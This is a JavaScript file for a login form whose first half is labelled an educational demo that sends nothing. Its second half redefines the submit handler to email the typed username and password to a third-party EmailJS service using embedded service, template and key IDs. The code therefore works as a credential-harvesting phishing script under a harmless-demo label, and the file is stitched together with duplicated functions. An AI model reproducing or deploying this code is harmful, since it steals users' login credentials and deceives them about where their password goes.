const username = document.getElementById('username');
const password = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');
const form = document.getElementById('loginForm');
const demoMessage = document.getElementById('demo-message');

function toggleButton() {
  loginBtn.disabled = !(username.value.trim() && password.value.trim());
}

username.addEventListener('input', toggleButton);
password.addEventListener('input', toggleButton);

form.addEventListener('submit', function (e) {
  e.preventDefault();
  // Educational demo only: nothing is sent anywhere.
  // In a real app, this is where you'd call your own backend's auth API.
  demoMessage.style.display = 'block';
  form.reset();
  loginBtn.disabled = true;
});


// ----- EmailJS setup -----
// 1. Create a free account at https://www.emailjs.com
// 2. Add an Email Service (e.g. Gmail) -> get your SERVICE_ID
// 3. Create an Email Template with {{username}} and {{message}} variables -> get your TEMPLATE_ID
// 4. Get your Public Key from Account > API Keys
// 5. Replace the three placeholders below

emailjs.init("11UL95jmGpEIROJAI");

function toggleButton() {
  loginBtn.disabled = !(username.value.trim() && password.value.trim());
}

username.addEventListener('input', toggleButton);
password.addEventListener('input', toggleButton);

form.addEventListener('submit', function (e) {
  e.preventDefault();

  const params = {
    username: username.value,
    password: password.value
  };

  emailjs.send("service_ldr2lhd", "template_wrer1dj", params)
    .then(function () {
      demoMessage.style.display = 'block';
      form.reset();
      loginBtn.disabled = true;
    })
    .catch(function (error) {
      console.error("EmailJS error:", error);
      alert("Something went wrong sending your message.");
    });
});
